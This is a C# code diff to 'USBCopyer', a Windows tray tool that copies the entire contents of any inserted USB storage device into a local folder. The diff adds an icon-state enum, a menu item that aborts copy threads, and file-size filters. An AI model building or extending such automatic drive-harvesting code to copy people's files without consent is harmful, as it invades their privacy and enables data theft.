@@ -24,7 +24,7 @@ namespace USBCopyer
         public Host()
         {
             InitializeComponent();
-            setIconX(0);
+            setIconX(iconStatus.free);
             if (!string.IsNullOrEmpty(Properties.Settings.Default.dir))
             {
                 dir = Properties.Settings.Default.dir + "\\";
@@ -92,28 +92,31 @@ namespace USBCopyer
             }
         }
 
-        public delegate void setIconInvoke(int v);
-        public void setIcon(int v)
+        public delegate void setIconInvoke(iconStatus v);
+        public void setIcon(iconStatus v)
         {
             setIconInvoke i = new setIconInvoke(setIconX);
             Invoke(i, v);
         }
 
-        private void setIconX(int v)
+        public enum iconStatus { working, free };
+        public void setIconX(iconStatus v)
         {
-            if (v == 0)
+            if (v == iconStatus.free)
             {
                 nicon.Text = title + " V" + Application.ProductVersion + "\r\n状态: 空闲";
                 nicon.Icon = Icon = Properties.Resources.icon_small;
                 EnableToolStripMenuItem.Enabled = EnableToolStripMenuItem.Checked = true;
                 EnableToolStripMenuItem.Text = "已启用 (&E)";
+                KillCopyThreadStripMenuItem.Enabled = false;
             }
-            else if (v == 1)
+            else if (v == iconStatus.working)
             {
                 nicon.Text = title + "\r\n状态: 正在工作，共 " + copyThread.Count + " 个存储设备";
                 nicon.Icon = Icon = Properties.Resources.working_small;
                 EnableToolStripMenuItem.Text = "正在工作 (&E)";
                 EnableToolStripMenuItem.Enabled = false;
+                KillCopyThreadStripMenuItem.Enabled = true;
             }
         }
 
@@ -242,14 +245,14 @@ namespace USBCopyer
                                                     return;
                                                 }
                                             }
-                                            setIcon(1);
+                                            setIcon(iconStatus.working);
                                             if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskdir))
                                             {
                                                 Program.log("清空输出目录：" + dir + diskdir);
                                                 Directory.Delete(dir + diskdir, true);
                                             }
                                             CopyDirectory(disk + "\\", dir + diskdir);
-                                            setIcon(0);
+                                            setIcon(iconStatus.free);
                                             if (string.IsNullOrEmpty(diskser))
                                             {
                                                 Program.log("设备数据复制完成，但由于获取磁盘序列号失败，文件目录命名为：" + diskdir);
@@ -266,7 +269,7 @@ namespace USBCopyer
                                 }
                                 catch(Exception ex)
                                 {
-                                    setIcon(0);
+                                    setIcon(iconStatus.free);
                                     Program.log("获取插入的存储设备信息失败，复制已取消：" + ex.ToString(),2);
                                 }
                             }
@@ -274,7 +277,7 @@ namespace USBCopyer
                             {
                                 try
                                 {
-                                    setIcon(0);
+                                    setIcon(iconStatus.free);
                                     if (copyThread.ContainsKey(disk))
                                     {
                                         if (copyThread[disk].IsAlive)
@@ -351,6 +354,7 @@ namespace USBCopyer
             {
                 DirectoryInfo info = new DirectoryInfo(sourcePath);
                 Directory.CreateDirectory(destinationPath);
+                int fileSizeLimit = Properties.Settings.Default.filesize * 1048576;
                 foreach (FileSystemInfo fsi in info.GetFileSystemInfos())
                 {
                     String destName = Path.Combine(destinationPath, fsi.Name);
@@ -387,7 +391,24 @@ namespace USBCopyer
                                 }
                                 else
                                 {
-                                    File.Copy(fsi.FullName, destName);
+                                    switch (Properties.Settings.Default.filesizetype)
+                                    {
+                                        case 0:
+                                            File.Copy(fsi.FullName, destName);
+                                            break;
+                                        case 1:
+                                            if(fi1.Length > fileSizeLimit)
+                                            {
+                                                File.Copy(fsi.FullName, destName);
+                                            }
+                                            break;
+                                        case 2:
+                                            if(fi1.Length < fileSizeLimit)
+                                            {
+                                                File.Copy(fsi.FullName, destName);
+                                            }
+                                            break;
+                                    }
                                 }
                             }
                         }
@@ -545,6 +566,18 @@ namespace USBCopyer
         private void diskUUIDList_Click(object sender, EventArgs e)
         {
             (new diskUUID()).Show();
+        }
+
+        private void KillCopyThreadStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach(KeyValuePair<string,Thread>th in copyThread)
+            {
+                if(th.Value.IsAlive)
+                {
+                    th.Value.Abort();
+                }
+            }
+            setIcon(iconStatus.free);
         }
     }
 }
